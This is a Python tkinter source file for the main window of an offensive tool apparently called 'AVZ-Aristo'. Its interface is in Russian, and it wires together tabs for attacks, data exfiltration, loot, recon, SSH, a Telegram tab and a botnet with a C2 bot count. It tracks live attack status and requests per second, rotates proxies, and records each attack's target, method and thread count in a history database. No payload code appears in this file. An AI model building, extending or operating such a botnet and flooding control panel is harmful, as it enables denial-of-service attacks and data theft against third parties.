import tkinter as tk
from tkinter import ttk
import sqlite3, os, json, time, threading
from datetime import datetime
from utils.helpers import load_settings, save_settings
from utils.logger import AppLogger
from utils.toast import Toast
from engine.proxy import ProxyManager
from gui.widgets import ToolTip, RightClickMenu
from gui.tabs.attack_tab import AttackTab
from gui.tabs.exfil_tab import ExfilTab
from gui.tabs.proxy_tab import ProxyTab
from gui.tabs.recon_tab import ReconTab
from gui.tabs.botnet_tab import BotnetTab
from gui.tabs.telegram_tab import TelegramTab
from gui.tabs.loot_tab import LootTab
from gui.tabs.monitor_tab import MonitorTab
from gui.tabs.auto_tab import AutoTab
from gui.tabs.settings_tab import SettingsTab
from gui.tabs.help_tab import HelpTab
from gui.tabs.ssh_tab import SshTab

HISTORY_DB = "attack_history.db"

# Светлая тема с белыми полями
COLORS = {
    'bg': '#f0f0f0',
    'fg': '#000000',
    'accent': '#c00000',
    'success': '#008000',
    'warning': '#aa8800',
    'button_bg': '#e0e0e0',
    'button_fg': '#000000',
    'entry_bg': '#ffffff',
    'treeview_bg': '#ffffff',
    'treeview_fg': '#000000',
    'treeview_heading_bg': '#d0d0d0',
    'progressbar_trough': '#e0e0e0',
    'progressbar_color': '#00c000',
    'tab_bg': '#d0d0d0',
    'tab_fg': '#000000',
    'frame_bg': '#f0f0f0',
    'label_fg': '#000000',
    'status_fg': '#008000',
    'border_color': '#888888',
}

class App:
    def __init__(self, root):
        self.root = root
        self.root.title("AVZ-Aristo v25.2 RAGE")
        self.root.state('zoomed')
        self.settings = load_settings()
        self.colors = COLORS
        self.bg = self.colors['bg']
        self.fg = self.colors['fg']
        self.accent = self.colors['accent']
        self.success = self.colors['success']
        self.warning = self.colors['warning']
        self.theme = 'light'          # ← светлая тема для всех вкладок
        self.root.configure(bg=self.bg)
        self._apply_ttk_style()
        self.logger = AppLogger()
        self.logger.info("Приложение запущено")
        self.proxy_manager = ProxyManager()
        self.graph_data = [[], []]
        self._init_db()
        self._create_dashboard()
        self._create_notebook()
        self._create_statusbar()
        self.tray = None
        if self.settings.get("tray_enabled", True):
            self._init_tray()
        self.root.protocol("WM_DELETE_WINDOW", self._on_closing)
        self._load_state()
        self._pulse_phase = 0
        self._start_auto_proxy()
        self._animate_status()

    def _apply_ttk_style(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TFrame', background=self.bg)
        style.configure('TLabel', background=self.bg, foreground=self.fg)
        style.configure('TButton', background=self.colors['button_bg'], foreground=self.colors['button_fg'], borderwidth=1)
        style.map('TButton', background=[('active', '#c0c0c0'), ('pressed', '#a0a0a0')])
        style.configure('Accent.TButton', background=self.accent, foreground='white')
        style.map('Accent.TButton', background=[('active', '#a00000')])
        style.configure('Success.TButton', background=self.success, foreground='white')
        style.map('Success.TButton', background=[('active', '#006400')])
        style.configure('TEntry', fieldbackground=self.colors['entry_bg'], foreground=self.fg)
        style.configure('TSpinbox', fieldbackground=self.colors['entry_bg'], foreground=self.fg)
        style.configure('TNotebook', background=self.bg)
        style.configure('TNotebook.Tab', background=self.colors['tab_bg'], foreground=self.colors['tab_fg'])
        style.configure('TLabelframe', background=self.bg, foreground=self.fg)
        style.configure('TLabelframe.Label', background=self.bg, foreground=self.fg)
        style.configure('Treeview', background=self.colors['treeview_bg'], foreground=self.colors['treeview_fg'], fieldbackground=self.colors['treeview_bg'])
        style.configure('Treeview.Heading', background=self.colors['treeview_heading_bg'], foreground=self.colors['treeview_fg'])
        style.configure('TProgressbar', troughcolor=self.colors['progressbar_trough'], background=self.colors['progressbar_color'])
        style.configure('green.Horizontal.TProgressbar', troughcolor=self.colors['progressbar_trough'], background=self.colors['progressbar_color'])
        style.configure('Vertical.TScrollbar', background=self.colors['button_bg'], arrowcolor=self.fg)

    def _create_dashboard(self):
        self.dash_frame = tk.Frame(self.root, bg=self.bg, height=80, relief=tk.GROOVE, bd=1)
        self.dash_frame.pack(fill=tk.X, padx=10, pady=(10,0))
        self.dash_frame.pack_propagate(False)
        dash_left = tk.Frame(self.dash_frame, bg=self.bg)
        dash_left.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        dash_right = tk.Frame(self.dash_frame, bg=self.bg)
        dash_right.pack(side=tk.RIGHT, fill=tk.BOTH)

        proxy_block = tk.Frame(dash_left, bg=self.bg)
        proxy_block.pack(side=tk.LEFT, padx=10)
        self.proxy_circle = tk.Canvas(proxy_block, width=24, height=24, bg=self.bg, highlightthickness=0)
        self.proxy_circle.pack(side=tk.LEFT, padx=(0,5))
        self.proxy_label = tk.Label(proxy_block, text="0", bg=self.bg, fg=self.fg, font=('Arial', 10))
        self.proxy_label.pack(side=tk.LEFT)
        tk.Label(proxy_block, text="Прокси", bg=self.bg, fg='#666666', font=('Arial', 7)).pack(side=tk.LEFT, padx=2)

        bot_block = tk.Frame(dash_left, bg=self.bg)
        bot_block.pack(side=tk.LEFT, padx=10)
        self.bot_circle = tk.Canvas(bot_block, width=24, height=24, bg=self.bg, highlightthickness=0)
        self.bot_circle.pack(side=tk.LEFT, padx=(0,5))
        self.bot_label = tk.Label(bot_block, text="0", bg=self.bg, fg=self.fg, font=('Arial', 10))
        self.bot_label.pack(side=tk.LEFT)
        tk.Label(bot_block, text="Боты", bg=self.bg, fg='#666666', font=('Arial', 7)).pack(side=tk.LEFT, padx=2)

        attack_block = tk.Frame(dash_left, bg=self.bg)
        attack_block.pack(side=tk.LEFT, padx=10)
        self.attack_circle = tk.Canvas(attack_block, width=24, height=24, bg=self.bg, highlightthickness=0)
        self.attack_circle.pack(side=tk.LEFT, padx=(0,5))
        self.attack_label = tk.Label(attack_block, text="Нет", bg=self.bg, fg=self.fg, font=('Arial', 10))
        self.attack_label.pack(side=tk.LEFT)
        tk.Label(attack_block, text="Атака", bg=self.bg, fg='#666666', font=('Arial', 7)).pack(side=tk.LEFT, padx=2)

        self.cpu_label = tk.Label(dash_right, text="CPU: 0%", bg=self.bg, fg=self.fg, font=('Arial', 9))
        self.cpu_label.pack(side=tk.RIGHT, padx=5)
        self.mem_label = tk.Label(dash_right, text="MEM: 0%", bg=self.bg, fg=self.fg, font=('Arial', 9))
        self.mem_label.pack(side=tk.RIGHT, padx=10)
        self._update_dashboard()

    def _update_dashboard(self):
        if hasattr(self, 'proxy_manager') and self.proxy_manager.proxies:
            count = len(self.proxy_manager.proxies)
            self.proxy_label.config(text=str(count))
            self._draw_circle(self.proxy_circle, count > 0)
        else:
            self.proxy_label.config(text="0")
            self._draw_circle(self.proxy_circle, False)
        if hasattr(self, 'botnet_tab') and hasattr(self.botnet_tab, 'c2'):
            count = len(self.botnet_tab.c2.get_bots()) if self.botnet_tab.c2 else 0
            self.bot_label.config(text=str(count))
            self._draw_circle(self.bot_circle, count > 0)
        else:
            self.bot_label.config(text="0")
            self._draw_circle(self.bot_circle, False)
        if hasattr(self, 'attack_tab') and self.attack_tab.attack_active:
            self.attack_label.config(text="Активна")
            self._draw_circle(self.attack_circle, True, color='red')
        else:
            self.attack_label.config(text="Нет")
            self._draw_circle(self.attack_circle, False)
        try:
            import psutil
            self.cpu_label.config(text=f"CPU: {psutil.cpu_percent()}%")
            self.mem_label.config(text=f"MEM: {psutil.virtual_memory().percent}%")
        except:
            pass
        self.root.after(2000, self._update_dashboard)

    def _draw_circle(self, canvas, active, color=None):
        canvas.delete('all')
        if active:
            fill = color or self.success
        else:
            fill = '#aaaaaa'
        canvas.create_oval(4, 4, 20, 20, fill=fill, outline='')

    def _create_notebook(self):
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        self.attack_tab = AttackTab(self.notebook, self)
        self.exfil_tab = ExfilTab(self.notebook, self)
        self.loot_tab = LootTab(self.notebook, self)
        self.proxy_tab = ProxyTab(self.notebook, self)
        self.recon_tab = ReconTab(self.notebook, self)
        self.botnet_tab = BotnetTab(self.notebook, self)
        self.telegram_tab = TelegramTab(self.notebook, self)
        self.ssh_tab = SshTab(self.notebook, self)
        self.monitor_tab = MonitorTab(self.notebook, self)
        self.auto_tab = AutoTab(self.notebook, self)
        self.settings_tab = SettingsTab(self.notebook, self)
        self.help_tab = HelpTab(self.notebook, self)

    def _create_statusbar(self):
        self.status_frame = tk.Frame(self.root, bg=self.bg, height=30)
        self.status_frame.pack(fill=tk.X, side=tk.BOTTOM, padx=10, pady=(0,5))
        self.status_indicator = tk.Canvas(self.status_frame, width=16, height=16, bg=self.bg, highlightthickness=0)
        self.status_indicator.pack(side=tk.LEFT, padx=5)
        self.status_label = tk.Label(self.status_frame, text="Готов", bg=self.bg, fg=self.success, anchor='w', font=('Consolas', 9))
        self.status_label.pack(side=tk.LEFT, padx=5)
        self.breadcrumb_label = tk.Label(self.status_frame, text="", bg=self.bg, fg='#666666', anchor='w', font=('Consolas', 9))
        self.breadcrumb_label.pack(side=tk.LEFT, padx=20)

    def _animate_status(self):
        if hasattr(self, 'attack_tab') and self.attack_tab.attack_active:
            color = '#ff0000'
        else:
            color = self.success
        self._pulse_phase += 1
        r = 6 + (1 if self._pulse_phase % 2 == 0 else 0)
        self.status_indicator.delete('all')
        self.status_indicator.create_oval(8-r, 8-r, 8+r, 8+r, fill=color, outline='')
        self.root.after(500, self._animate_status)

    def show_toast(self, message, duration=3):
        Toast(self.root, message, duration)

    def set_status(self, text, breadcrumb=''):
        self.status_label.config(text=text)
        self.breadcrumb_label.config(text=breadcrumb)

    def _init_tray(self):
        try:
            import pystray
            from PIL import Image, ImageDraw
            def create_image(color):
                img = Image.new('RGB', (64,64), color)
                d = ImageDraw.Draw(img)
                d.rectangle([16,16,48,48], fill='black')
                return img
            self.tray_icon = pystray.Icon("avz", create_image('green'), "AVZ-Aristo", menu=pystray.Menu(
                pystray.MenuItem("Показать", self._show_from_tray, default=True),
                pystray.MenuItem("Выход", self._exit_app)
            ))
            threading.Thread(target=self.tray_icon.run, daemon=True).start()
        except ImportError:
            pass

    def _show_from_tray(self):
        self.root.deiconify()
        self.root.state('zoomed')

    def _on_closing(self):
        self.logger.info("Приложение завершает работу")
        self._save_state()
        if hasattr(self, 'tray_icon'):
            self.root.withdraw()
        else:
            self.root.destroy()

    def _exit_app(self):
        if hasattr(self, 'tray_icon'):
            self.tray_icon.stop()
        self.root.destroy()

    def update_monitor(self, rps, total):
        self.graph_data[0].append(rps)
        self.graph_data[1].append(total)
        if len(self.graph_data[0]) > 60:
            self.graph_data[0] = self.graph_data[0][-60:]
            self.graph_data[1] = self.graph_data[1][-60:]
        if hasattr(self, 'monitor_tab'):
            self.monitor_tab.refresh_plot(self.graph_data)

    def save_attack_history(self, target, method, threads, start_time, end_time, total_requests):
        try:
            conn = sqlite3.connect(HISTORY_DB)
            c = conn.cursor()
            c.execute("INSERT INTO attacks (target, method, threads, start_time, end_time, total_requests) VALUES (?,?,?,?,?,?)",
                      (target, method, threads, datetime.fromtimestamp(start_time).isoformat(),
                       datetime.fromtimestamp(end_time).isoformat(), total_requests))
            conn.commit()
            conn.close()
            self.logger.info(f"Атака сохранена в историю: {target}")
        except Exception as e:
            self.logger.error(f"Ошибка сохранения истории: {e}")

    def _init_db(self):
        conn = sqlite3.connect(HISTORY_DB)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS attacks (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        target TEXT, method TEXT, threads INTEGER,
                        start_time TEXT, end_time TEXT,
                        max_rps REAL DEFAULT 0, total_requests INTEGER DEFAULT 0)''')
        conn.commit()
        conn.close()

    def _save_state(self):
        try:
            state = {
                'tab': self.notebook.index('current') if self.notebook else 0,
                'target': self.attack_tab.target_entry.get() if hasattr(self, 'attack_tab') else ''
            }
            with open("avz_state.json", 'w') as f:
                json.dump(state, f)
        except:
            pass

    def _load_state(self):
        if os.path.exists("avz_state.json"):
            try:
                with open("avz_state.json") as f:
                    state = json.load(f)
                if hasattr(self, 'attack_tab'):
                    self.attack_tab.target_entry.insert(0, state.get('target', ''))
                self.notebook.select(state.get('tab', 0))
            except:
                pass

    def _start_auto_proxy(self):
        interval = self.settings.get('auto_update_proxies', 0)
        if interval > 0:
            self.proxy_manager.start_auto_update(interval,
                                                 self.settings.get('proxy_speed_limit', 1.0),
                                                 self.settings.get('geo_filter', ''),
                                                 self.settings.get('elite_only', False))

    def set_theme(self, theme_name):
        pass